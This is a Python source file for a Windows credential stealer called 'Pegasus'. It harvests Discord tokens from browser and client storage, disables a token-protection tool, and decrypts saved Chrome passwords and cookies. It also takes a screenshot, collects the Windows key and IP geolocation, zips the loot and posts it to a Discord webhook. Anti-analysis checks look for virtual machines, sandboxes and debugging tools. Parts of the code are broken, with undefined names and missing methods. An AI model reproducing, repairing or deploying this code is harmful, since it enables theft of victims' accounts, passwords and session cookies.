import base64
import difflib
import json
import os
import sys
import winreg
from base64 import b64decode
from json import load, loads
from platform import platform
from re import findall, match
from shutil import copy2
from sqlite3 import connect
from subprocess import PIPE, Popen
from threading import Thread
from time import localtime, strftime
from urllib.request import urlopen
from zipfile import ZipFile

import psutil
import requests
import winshell
from Crypto.Cipher import AES
from cryptography.fernet import Fernet
from discord import Embed, File, RequestsWebhookAdapter, Webhook
from pyautogui import screenshot
from win32api import SetFileAttributes
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32crypt import CryptUnprotectData

WEBHOOK_URL = "&WEBHOOK_URL&"

def main():
    global file

    grabtokens()

    threads = []
    for thread in [
        Thread(target=ss),
        Thread(target=password),
        Thread(target=cookiemonster)
        ]:

        thread.start()
        threads.append(thread)

    for t in threads:
            t.join()
    zipup()

    file = None
    file = File(f'Pegasus-{os.getenv("UserName")}.zip')

def pegasus(self):
    for func in {
        main(),
        sendwebhook(self),
        time.sleep(0.2),
        cleanup(),
    }:
        try:
            func()
        except:
            pass

class grabtokens():
    def __init__(self):

        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\utilization"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception:
            pass

        self.tokens = []
        self.discord_psw = []
        self.backup_codes = []

        self.grabTokens()

    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def bypassTokenProtector(self):
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        config = tp+"config.json"
        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except Exception:
                pass
        try:
            with open(config) as f:
                item = json.load(f)
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420

            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)


        except Exception:
            pass

    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"


    def grabTokens(self):
        global token, tokens, username, phone, email

        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for _, path in paths.items():
            if not os.path.exists(path):
                continue
            if not "discord" in path:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                try:
                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                except Exception:
                                    pass
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)
            else:
                if os.path.exists(self.roaming+'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = None
                                token = self.decrypt_password(base64.b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))

                                r = requests.get(self.baseurl, headers=self.getheaders(token))
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                try:
                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                except Exception:
                                    pass
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)

        for token in self.tokens:
            r = requests.get(
                'https://discord.com/api/v9/users/@me',
                headers={"Authorization": token})

            username = r.json()['username'] + '#' + r.json()['discriminator']
            phone = r.json()['phone']
            email = r.json()['email']

def ss():
    screenshot('screenshot.png')

class password():
    def __init__(self):
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")

        if not os.path.exists(self.appdata+'\\Google'):
            self.files += f"**{os.getlogin()}** doesn't have google installed\n"
        else:
            self.grabPassword()

        return

    def get_master_key(self):
        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"

    def grabPassword(self):
        master_key = self.get_master_key()
        with open("Google Passwords.txt", "w") as f:
            f.write("Made by Addidix | Redesign by Antwan#1110\n\n<" + "=" * 50 + ">\n\n")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        try:
            copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, master_key)
                if url != "":
                    with open("Google Passwords.txt", "a") as f:
                        f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n<" + "=" * 50 + ">\n\n")
        except:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass

class cookiemonster:
    def __init__(self):
        self.appdata = os.getenv("localappdata")
        self.grabCookies()

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabCookies(self):
        master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\Default\\Network\\cookies'
        try:
            copy2(login_db, "Loginvault.db")
        except Exception:
            pass
        conn = connect("Loginvault.db")
        cursor = conn.cursor()
        with open(".\Google Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            f.write("Made by Addidix | Redesign by Atwan#1110\n\n<" + "=" * 50 + ">\n\n")
        with open(".\Google Cookies.txt", "a", encoding="cp437", errors='ignore') as f:
            try:
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                for r in cursor.fetchall():
                    host = r[0]
                    user = r[1]
                    encrypted_cookie = r[2]
                    decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
                    if host != "":
                        f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n<" + "=" * 50 + ">\n\n")
            except Exception:
                pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception:
            pass

def getProductValues():
    try:
        wkey = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
    except:
        wkey = "N/A (Likely Pirated)"
    try:
        productName = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
    except:
        productName = "N/A"
    return [productName, wkey]

def zipup():
    with ZipFile(f'Pegasus-{os.getenv("UserName")}.zip', 'w') as zipf:
        zipf.write("Google Passwords.txt")
        zipf.write("Google Cookies.txt")
        zipf.write("screenshot.png")

def sendwebhook(self):

    self.tokens = token

    w = getProductValues()
    wname = w[0].replace(" ", "᠎ ")
    wkey = w[1].replace(" ", "᠎ ")
    ram = str(psutil.virtual_memory()[0]/1024/1024/1024).split(".")[0]
    disk = str(psutil.disk_usage('/')[0]/1024/1024/1024).split(".")[0]
    # ip, country, city, region, googlemap = "None"
    data = httpx.get("https://ipinfo.io/json").json()
    ip = data.get('ip').replace(" ", "᠎ ")
    city = data.get('city').replace(" ", "᠎ ")
    country = data.get('country').replace(" ", "᠎ ")
    region = data.get('region').replace(" ", "᠎ ")
    org = data.get('org').replace(" ", "᠎ ")
    googlemap = "https://www.google.com/maps/search/google+map++" + \
    data.get('loc')

    embed = {
        'username': 'Pegasus',
        'color': '15535980',
        'avatar_url': 'https://pbs.twimg.com/profile_images/1345049393720741888/bcLbvYNa_400x400.jpg',
        'embeds': [
            {
                'author': {
                        'name': f'Logged: *{os.getlogin()}*',
                        'icon_url': ''
                    },
                'fields': [
                    {
                        'name': 'Account',
                        'value': f'''```fix
                                IP:᠎ {ip}
                                Org:᠎ {org}
                                City:᠎ {city}
                                Region:᠎ {region}
                                Country:᠎ {country}```
                                [Google Maps]({googlemap})
                            '''.replace(' ', ''),
                            'inline': True
                    },
                        {
                            'name': 'Computer Info',
                            'value': f'''```fix
                                PCName: {os.getenv('COMPUTERNAME').replace(" ", "᠎ ")}
                                WinKey:᠎ {wkey}
                                Platform:᠎ {wname}
                                DiskSpace:᠎ {disk}GB
                                Ram:᠎ {ram}GB```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': 'Tokens',
                            'value': f'''```fix
                                {self.tokens if self.tokens else "No tokens extracted"}```
                            '''.replace(' ', ''),
                            'inline': False
                        },
                        {
                            'name': 'Credits',
                            'value': 'Made by Addidix, Redesign by Antwan#1110'
                        }
                    ],
                'footer': {
                        'text': f"Made by Addidix, Embed/TxT Redesign by Antwan#1110 | Date: {strftime('%D | %H:%M:%S', localtime())}"
                    }
                }
            ]
        }
    httpx.post(WEBHOOK_URL, json=embed)
    httpx.post(WEBHOOK_URL, files={'upload_file': f})

def cleanup():
    for clean in [
                  os.remove("Google Passwords.txt"),
                  os.remove("Google Cookies.txt"),
                  os.remove("screenshot.png"),
                  os.remove(f"Pegasus-{os.getenv('UserName')}.zip")]:
        try:
            clean()
        except Exception:
            pass

class debug:
    def __init__(self):
        if self.checks(): self.self_destruct()

    def checks(self):
        debugging = False

        # blackList from Rdimo
        self.blackListedUsers = ["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl",]
        self.blackListedPCNames = ["BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4","DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET","SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R","WILEYPC","WORK","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ","DESKTOP-5OV9S0O","QarZhrdBpj","ORELEEPC","ARCHIBALDPC","JULIA-PC","d1bnJkfVlH",]
        self.blackListedHWIDS = ["7AB5C494-39F5-4941-9163-47F54D6D5016","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-000000000000","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27","79AF5279-16CF-4094-9758-F88A616D81B4",]
        self.blackListedIPS = ["88.132.231.71","78.139.8.50","20.99.160.173","88.153.199.169","84.147.62.12","194.154.78.160","92.211.109.160","195.74.76.222","188.105.91.116","34.105.183.68","92.211.55.199","79.104.209.33","95.25.204.90","34.145.89.174","109.74.154.90","109.145.173.169","34.141.146.114","212.119.227.151","195.239.51.59","192.40.57.234","64.124.12.162","34.142.74.220","188.105.91.173","109.74.154.91","34.105.72.241","109.74.154.92","213.33.142.50",]
        self.blacklistedProcesses = ["httpdebuggerui.exe","wireshark.exe","fiddler.exe","regedit.exe","cmd.exe","vboxservice.exe","df5serv.exe","processhacker.exe","vboxtray.exe","vmtoolsd.exe","vmwaretray.exe","ida64.exe","ollydbg.exe","pestudio.exe","vmwareuser","vgauthservice.exe","vmacthlp.exe","x96dbg.exe","vmsrvc.exe","x32dbg.exe","vmusrvc.exe","prl_cc.exe","prl_tools.exe","xenservice.exe","qemu-ga.exe","joeboxcontrol.exe","ksdumperclient.exe","ksdumper.exe","joeboxserver.exe"]


        self.check_process()

        if self.get_ip(): debugging = True
        if self.get_hwid(): debugging = True
        if self.get_pcname(): debugging = True
        if self.get_username(): debugging = True

        return debugging

    def check_process(self):
        for process in self.blacklistedProcesses:
            if process in (p.name() for p in psutil.process_iter()):
                self.self_destruct()

    def get_ip(self):
        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = json.load(response)
        ip = data['ip']

        if ip in self.blackListedIPS:
            return True

    def get_hwid(self):
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

        if hwid in self.blackListedHWIDS:
            return True

    def get_pcname(self):
        pc_name = os.getenv("COMPUTERNAME")

        if pc_name in self.blackListedPCNames:
            return True

    def get_username(self):
        pc_username = os.getenv("UserName")

        if pc_username in self.blackListedUsers:
            return True

    def self_destruct(self):
        #os.system("del {}\{}".format(os.path.dirname(__file__), os.path.basename(__file__))) #Uncomment to use
        exit()


if __name__ == "__main__":
    if os.name == "nt":
        if os.getlogin != "WDAGUtilityAccount":
            start()
            init()
